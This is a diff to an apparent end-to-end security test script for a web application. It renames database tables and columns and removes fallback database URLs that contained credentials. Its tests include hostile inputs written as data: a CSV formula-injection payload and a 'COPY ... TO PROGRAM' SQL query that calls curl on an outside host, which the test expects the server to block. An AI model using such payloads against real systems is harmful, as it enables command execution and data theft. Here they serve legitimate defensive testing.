@@ -43,9 +43,6 @@ const ini = loadConfigIni(rootDir);
 const candidateUrls = [
 	process.env.DATABASE_URL,
 	ini?.database?.url,
-	'postgresql://orbit:orbit_secret_2026@localhost:5432/orbit',
-	'postgresql://kulup:kulup_secret_2026@localhost:5432/kulup',
-	'postgresql://postgres:postgres@localhost:5432/orbit_db',
 ].filter(Boolean);
 const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3000';
 
@@ -210,6 +207,9 @@ async function run() {
 		// SCENARIO 3: End-to-End Quarantine Blocking of Banned IP Address
 		// -----------------------------------------------------------------------
 		log.step(3, 'End-to-End Quarantine Blocking of Banned IP Address');
+
+		// Wait for multi-worker in-memory firewall cache TTL (1000ms) to sync
+		await new Promise((r) => setTimeout(r, 1100));
 
 		// 3.1 Public News API
 		const bannedNewsRes = await fetch(`${BASE_URL}/api/public/v1/news`, {
@@ -408,7 +408,7 @@ async function run() {
 
 		// Verify existence of system logs
 		const logsRes = await client.query(
-			`SELECT count(*) FROM sistem_loglari WHERE servis IN ('security', 'waf') AND zaman > $1`,
+			`SELECT count(*) FROM system_logs WHERE servis IN ('security', 'waf') AND zaman > $1`,
 			[Date.now() - 60000]
 		);
 		log.ok(`Security and WAF events recorded in audit logs (${logsRes.rows[0].count} new records).`);
@@ -491,8 +491,8 @@ async function run() {
 		const adminSessionToken = crypto.randomBytes(32).toString('hex');
 		const sessionExpiry = Date.now() + 24 * 3600 * 1000;
 		await client.query(
-			`INSERT INTO kullanicilar (id, ad, soyad, email, sifrehash, bolum, sinif, rolid, status, aktifoturumtoken, oturumbitis, totpenabled, olusturma)
-			 VALUES ($1, 'Admin', 'SoC', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', 4, 'rol_admin', 'aktif', $3, $4, 1, $5)`,
+			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at)
+			 VALUES ($1, 'Admin', 'SoC', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', '4', 'rol_admin', 'aktif', $3, $4, 1, $5)`,
 			[adminUserId, `e2e_soc_inspector_${Date.now()}@orbit.local`, adminSessionToken, sessionExpiry, Date.now()]
 		);
 
@@ -607,7 +607,7 @@ async function run() {
 
 			// Test CSV formula injection defense (OWASP)
 			await client.query(
-				`INSERT INTO sistem_loglari (zaman, servis, seviye, mesaj, ip, userId)
+				`INSERT INTO system_logs (zaman, servis, seviye, mesaj, ip, userId)
 				 VALUES ($1, 'security', 'WARN', '=cmd|'' /C calc''!A0', '198.51.100.77', $2)`,
 				[Date.now(), adminUserId]
 			);
@@ -635,7 +635,7 @@ async function run() {
 			// 6.7 SIEM Advanced Filtration and Negative (Not-Equals) Operator Tests
 			const testNow = Date.now();
 			await client.query(
-				`INSERT INTO sistem_loglari (zaman, servis, seviye, mesaj, ip, userId)
+				`INSERT INTO system_logs (zaman, servis, seviye, mesaj, ip, userId)
 				 VALUES 
 				 ($1, 'security', 'CRITICAL', 'SIEM_EXCEL_TEST_MALWARE_DETECTED', '198.51.100.88', 'usr_test_1'),
 				 ($2, 'auth', 'INFO', 'SIEM_EXCEL_TEST_INFO_HEARTBEAT', '127.0.0.1', 'usr_test_2'),
@@ -728,7 +728,7 @@ async function run() {
 			log.ok(`Global HTTP security headers (HSTS: ${hsts}, COOP: ${coop}, CORP: ${corp}) verified.`);
 
 		} finally {
-			await client.query('DELETE FROM kullanicilar WHERE id = $1', [adminUserId]);
+			await client.query('DELETE FROM users WHERE id = $1', [adminUserId]);
 		}
 
 		// -----------------------------------------------------------------------
@@ -769,7 +769,7 @@ async function run() {
 			const plaintextTotpSecret = setup2faData.secret;
 
 			// Verify totp_secret in database: MUST NOT BE PLAINTEXT, MUST BE ENCRYPTED WITH enc:v1:!
-			const dbTotpCheck = await client.query('SELECT totpSecret FROM kullanicilar WHERE id = $1', [hardeningUserId]);
+			const dbTotpCheck = await client.query('SELECT totp_secret AS totpsecret FROM users WHERE id = $1', [hardeningUserId]);
 			const storedSecretInDb = dbTotpCheck.rows[0]?.totpsecret || '';
 			if (!storedSecretInDb.startsWith('enc:v1:')) {
 				throw new Error(`2FA TOTP secret not encrypted with AES-256-GCM in PostgreSQL! Value: ${storedSecretInDb}`);
@@ -793,7 +793,7 @@ async function run() {
 				const errBody = await enable2faRes.text();
 				throw new Error(`2FA enable failed! HTTP: ${enable2faRes.status}, Body: ${errBody}`);
 			}
-			const dbTotpEnabledCheck = await client.query('SELECT totpEnabled FROM kullanicilar WHERE id = $1', [hardeningUserId]);
+			const dbTotpEnabledCheck = await client.query('SELECT totp_enabled AS totpenabled FROM users WHERE id = $1', [hardeningUserId]);
 			if (Number(dbTotpEnabledCheck.rows[0]?.totpenabled) !== 1) {
 				throw new Error('2FA verification failed to set totp_enabled = 1!');
 			}
@@ -801,7 +801,7 @@ async function run() {
 
 			// 7.2b Backward Compatibility (Legacy Plaintext TOTP Secret) Test
 			const legacySecret = 'JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP';
-			await client.query('UPDATE kullanicilar SET totpSecret = $1 WHERE id = $2', [legacySecret, hardeningUserId]);
+			await client.query('UPDATE users SET totp_secret = $1 WHERE id = $2', [legacySecret, hardeningUserId]);
 			const legacyTotpCode = await generateTotpToken({ secret: legacySecret });
 			const legacyVerifyRes = await fetch(`${BASE_URL}/api/auth/2fa/enable`, {
 				method: 'POST',
@@ -917,7 +917,7 @@ async function run() {
 			log.ok('Rate limit lock immediately lifted after reset and requests accepted again.');
 
 		} finally {
-			await client.query('DELETE FROM kullanicilar WHERE id = $1', [hardeningUserId]);
+			await client.query('DELETE FROM users WHERE id = $1', [hardeningUserId]);
 		}
 
 		// -----------------------------------------------------------------------
@@ -933,7 +933,7 @@ async function run() {
 		const testAdminId = crypto.randomUUID();
 		const testAdminSessionToken = crypto.randomBytes(32).toString('hex');
 		await client.query(
-			`INSERT INTO kullanicilar (id, ad, soyad, email, sifrehash, bolum, sinif, rolid, status, aktifoturumtoken, oturumbitis, totpenabled, olusturma, songirisip)
+			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at, last_login_ip)
 			 VALUES ($1, 'Admin', 'Hardening', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', 4, 'rol_admin', 'aktif', $3, $4, 1, $5, '127.0.0.1')`,
 			[testAdminId, `e2e_hard_admin_${Date.now()}@orbit.local`, testAdminSessionToken, Date.now() + 24 * 3600 * 1000, Date.now()]
 		);
@@ -989,7 +989,7 @@ async function run() {
 			const userBSession = crypto.randomBytes(32).toString('hex');
 
 			await client.query(
-				`INSERT INTO kullanicilar (id, ad, soyad, email, sifrehash, bolum, sinif, rolid, status, aktifoturumtoken, oturumbitis, olusturma)
+				`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, created_at)
 				 VALUES ($1, 'User', 'A', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Bilgisayar', 3, 'rol_uye', 'aktif', $3, $4, $5),
 				        ($6, 'User', 'B', $7, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Elektrik', 2, 'rol_uye', 'aktif', $8, $4, $5)`,
 				[
@@ -1037,7 +1037,7 @@ async function run() {
 				log.ok(`Notes IDOR attack attempt (User B -> User A note) repelled with 403 Forbidden.`);
 
 				// Verify original note was not corrupted in database
-				const checkNoteDb = await client.query('SELECT baslik, userId FROM kullanici_notlari WHERE id = $1', [noteAId]);
+				const checkNoteDb = await client.query('SELECT baslik, userid FROM user_notes WHERE id = $1', [noteAId]);
 				if (checkNoteDb.rows.length === 0 || checkNoteDb.rows[0].baslik !== 'User A Confidential Note') {
 					throw new Error('User A note was overwritten in IDOR attack!');
 				}
@@ -1159,7 +1159,7 @@ async function run() {
 				await client.query('DELETE FROM oauth_clients WHERE id = $1', [validOAuthData.client.id]);
 				await client.query('DELETE FROM security_blocks WHERE ip = $1', [bannedIpForPasskey]);
 			} finally {
-				await client.query('DELETE FROM user_notes WHERE user_id IN ($1, $2)', [userAId, userBId]).catch(() => {});
+				await client.query('DELETE FROM user_notes WHERE userid IN ($1, $2)', [userAId, userBId]).catch(() => {});
 				await client.query('DELETE FROM users WHERE id IN ($1, $2)', [userAId, userBId]);
 			}
 		} finally {
@@ -1189,6 +1189,7 @@ async function run() {
 				ogrenciNo: '24010108899',
 				bolum: 'Computer Science & Engineering',
 				sinif: 1,
+				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
 				kvkkKabul: true,
 				hp_website: 'https://malicious-spam-bot.xyz',
 			}),
@@ -1216,6 +1217,7 @@ async function run() {
 				ogrenciNo: regTestOgrenciNo,
 				bolum: 'Computer Science & Engineering',
 				sinif: 2,
+				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
 				kvkkKabul: true,
 				hp_website: '',
 			}),
@@ -1231,13 +1233,13 @@ async function run() {
 
 		// Verify OTP record in database: code must be hashed with SHA-256
 		const otpDbRes = await client.query(
-			'SELECT kod, songecerlilik FROM eposta_dogrulama WHERE email = $1 AND tur = $2',
+			'SELECT code, expires_at FROM email_verifications WHERE email = $1 AND type = $2',
 			[regTestEmail, 'registration']
 		);
 		if (otpDbRes.rowCount === 0) {
 			throw new Error('No record found in email_verifications table!');
 		}
-		const storedOtpHash = otpDbRes.rows[0].kod;
+		const storedOtpHash = otpDbRes.rows[0].code;
 		if (!storedOtpHash.startsWith('sha256:') || storedOtpHash.length !== 71) {
 			throw new Error(`OTP not stored in SHA-256 hash format (sha256:<64 hex>) in database! Value: ${storedOtpHash}`);
 		}
@@ -1248,7 +1250,7 @@ async function run() {
 		const testOtpCode = '839217';
 		const testOtpHash = 'sha256:' + crypto.createHash('sha256').update(testOtpCode).digest('hex');
 		await client.query(
-			'UPDATE eposta_dogrulama SET kod = $1 WHERE email = $2 AND tur = $3',
+			'UPDATE email_verifications SET code = $1 WHERE email = $2 AND type = $3',
 			[testOtpHash, regTestEmail, 'registration']
 		);
 
@@ -1263,6 +1265,7 @@ async function run() {
 				ogrenciNo: regTestOgrenciNo,
 				bolum: 'Computer Science & Engineering',
 				sinif: 2,
+				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
 				kvkkKabul: true,
 				verificationCode: testOtpCode,
 				hp_website: '',
@@ -1280,7 +1283,7 @@ async function run() {
 
 		// Verify OTP row deleted after successful verification
 		const postVerifyOtp = await client.query(
-			'SELECT * FROM eposta_dogrulama WHERE email = $1',
+			'SELECT * FROM email_verifications WHERE email = $1',
 			[regTestEmail]
 		);
 		if (postVerifyOtp.rowCount !== 0) {
@@ -1291,7 +1294,7 @@ async function run() {
 		// 9.4 Automatic Sweeping of Expired Legacy OTPs Test
 		const staleEmail = `stale_otp_${Date.now()}@orbit.local`;
 		await client.query(
-			`INSERT INTO eposta_dogrulama (email, kod, tur, songecerlilik, olusturma)
+			`INSERT INTO email_verifications (email, code, type, expires_at, created_at)
 			 VALUES ($1, 'sha256:stale', 'registration', $2, $3)`,
 			[staleEmail, Date.now() - 100000, Date.now() - 100000]
 		);
@@ -1309,12 +1312,13 @@ async function run() {
 				ogrenciNo: String(Date.now() + 1).slice(-11),
 				bolum: 'Computer Science & Engineering',
 				sinif: 1,
+				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
 				kvkkKabul: true,
 			}),
 		});
 
 		const staleCheckRes = await client.query(
-			'SELECT * FROM eposta_dogrulama WHERE email = $1',
+			'SELECT * FROM email_verifications WHERE email = $1',
 			[staleEmail]
 		);
 		if (staleCheckRes.rowCount !== 0) {
@@ -1334,6 +1338,7 @@ async function run() {
 				ogrenciNo: regTestOgrenciNo,
 				bolum: 'Computer Science & Engineering',
 				sinif: 2,
+				acceptedDocumentIds: ['legal_terms', 'legal_privacy', 'legal_cookies'],
 				kvkkKabul: true,
 			}),
 		});
@@ -1365,7 +1370,7 @@ async function run() {
 		const uploadAdminId = crypto.randomUUID();
 		const uploadAdminToken = crypto.randomBytes(32).toString('hex');
 		await client.query(
-			`INSERT INTO kullanicilar (id, ad, soyad, email, sifrehash, bolum, sinif, rolid, status, aktifoturumtoken, oturumbitis, totpenabled, olusturma)
+			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at)
 			 VALUES ($1, 'Upload', 'Admin', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', 4, 'rol_admin', 'aktif', $3, $4, 1, $5)`,
 			[uploadAdminId, `e2e_uploader_${Date.now()}@orbit.local`, uploadAdminToken, Date.now() + 3600000, Date.now()]
 		);
@@ -1424,7 +1429,7 @@ async function run() {
 			const memberAId = crypto.randomUUID();
 			const memberASession = crypto.randomBytes(32).toString('hex');
 			await client.query(
-				`INSERT INTO kullanicilar (id, ad, soyad, email, sifrehash, bolum, sinif, rolid, status, aktifoturumtoken, oturumbitis, olusturma)
+				`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, created_at)
 				 VALUES ($1, 'Member', 'PostaA', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Bilgisayar', 2, 'rol_uye', 'aktif', $3, $4, $5)`,
 				[memberAId, `member_a_${Date.now()}@orbit.local`, memberASession, Date.now() + 3600000, Date.now()]
 			);
@@ -1530,7 +1535,7 @@ async function run() {
 						'x-db-token': validDbToken,
 						'Content-Type': 'application/json',
 					},
-					body: JSON.stringify({ query: 'COPY kullanicilar TO PROGRAM \'curl http://malicious.xyz\'' }),
+					body: JSON.stringify({ query: 'COPY users TO PROGRAM \'curl http://malicious.xyz\'' }),
 				});
 				if (osPrimitiveRes.status !== 403) {
 					throw new Error(`Forbidden COPY ... PROGRAM SQL query was not blocked! HTTP: ${osPrimitiveRes.status}`);
@@ -1648,16 +1653,16 @@ async function run() {
 
 		try {
 			await client.query(
-				`INSERT INTO kullanicilar (id, ad, soyad, email, sifrehash, bolum, sinif, rolid, status, aktifoturumtoken, oturumbitis, songirisip, olusturma)
+				`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, last_login_ip, created_at)
 				 VALUES ($1, 'Security', 'Admin14', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', 4, 'rol_admin', 'aktif', $3, $4, $5, $6)`,
 				[test14UserId, `sec14_${Date.now()}@orbit.local`, test14TokenHash, session14Expiry, initialIp, Date.now()]
 			);
 
 			const userTokenCheck = await client.query(
-				`SELECT aktifOturumToken FROM kullanicilar WHERE id = $1`,
+				`SELECT session_token FROM users WHERE id = $1`,
 				[test14UserId]
 			);
-			const dbToken = userTokenCheck.rows[0]?.aktifoturumtoken || userTokenCheck.rows[0]?.aktifOturumToken;
+			const dbToken = userTokenCheck.rows[0]?.session_token;
 			if (!dbToken || !/^[a-f0-9]{64}$/.test(dbToken)) {
 				throw new Error(`Session token not stored as 64-character SHA-256 hash in database! Token: ${dbToken}`);
 			}
@@ -1710,7 +1715,7 @@ async function run() {
 			}
 			log.ok(`Pass-the-Cookie Shield Successful: Stolen cookie from different IP (${stolenCookieIp}) instantly frozen with 401 SESSION_IP_MISMATCH.`);
 		} finally {
-			await client.query('DELETE FROM kullanicilar WHERE id = $1', [test14UserId]).catch(() => {});
+			await client.query('DELETE FROM users WHERE id = $1', [test14UserId]).catch(() => {});
 		}
 
 		// SCENARIO 15: Docker Ingress Protection, Threat Intelligence & Emergency Kill-Switches
@@ -1719,7 +1724,7 @@ async function run() {
 		const s15AdminId = crypto.randomUUID();
 		const s15AdminToken = crypto.randomBytes(32).toString('hex');
 		await client.query(
-			`INSERT INTO kullanicilar (id, ad, soyad, email, sifrehash, bolum, sinif, rolid, status, aktifoturumtoken, oturumbitis, totpenabled, olusturma, songirisip)
+			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at, last_login_ip)
 			 VALUES ($1, 'Admin', 'KillSwitch', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber', 4, 'rol_admin', 'aktif', $3, $4, 1, $5, '127.0.0.1')`,
 			[s15AdminId, `e2e_killswitch_admin_${Date.now()}@orbit.local`, s15AdminToken, Date.now() + 86400000, Date.now()]
 		);
@@ -1868,7 +1873,7 @@ async function run() {
 				},
 				body: JSON.stringify({ action: 'toggle_kill_switch', key: 'passkeyOnly', value: false }),
 			}).catch(() => {});
-			await client.query('DELETE FROM kullanicilar WHERE id = $1', [s15AdminId]).catch(() => {});
+			await client.query('DELETE FROM users WHERE id = $1', [s15AdminId]).catch(() => {});
 		}
 
 		// =====================================================================
@@ -1878,7 +1883,7 @@ async function run() {
 		const s16AdminId = crypto.randomUUID();
 		const s16AdminToken = crypto.randomBytes(32).toString('hex');
 		await client.query(
-			`INSERT INTO kullanicilar (id, ad, soyad, email, sifrehash, bolum, sinif, rolid, status, aktifoturumtoken, oturumbitis, totpenabled, olusturma, songirisip)
+			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at, last_login_ip)
 			 VALUES ($1, 'SIEM', 'Admin', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber', 4, 'rol_admin', 'aktif', $3, $4, 1, $5, '127.0.0.1')`,
 			[s16AdminId, `e2e_siem_admin_${Date.now()}@orbit.local`, s16AdminToken, Date.now() + 86400000, Date.now()]
 		);
@@ -1952,7 +1957,7 @@ async function run() {
 			}
 			log.ok(`SoC Radar Overview DEFCON verification: DEFCON ${activeDefcon} (Peace State) confirmed.`);
 		} finally {
-			await client.query('DELETE FROM kullanicilar WHERE id = $1', [s16AdminId]).catch(() => {});
+			await client.query('DELETE FROM users WHERE id = $1', [s16AdminId]).catch(() => {});
 		}
 
 		const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
@@ -1966,7 +1971,7 @@ async function run() {
 		// Failsafe to restore lockdown mode in case of unhandled error
 		try {
 			await client.query(
-				`UPDATE sistem_ayarlari SET deger = '0' WHERE anahtar = 'soc_lockdown_mode'`
+				`UPDATE system_settings SET value = '0' WHERE key = 'soc_lockdown_mode'`
 			);
 		} catch {}
 		process.exit(1);
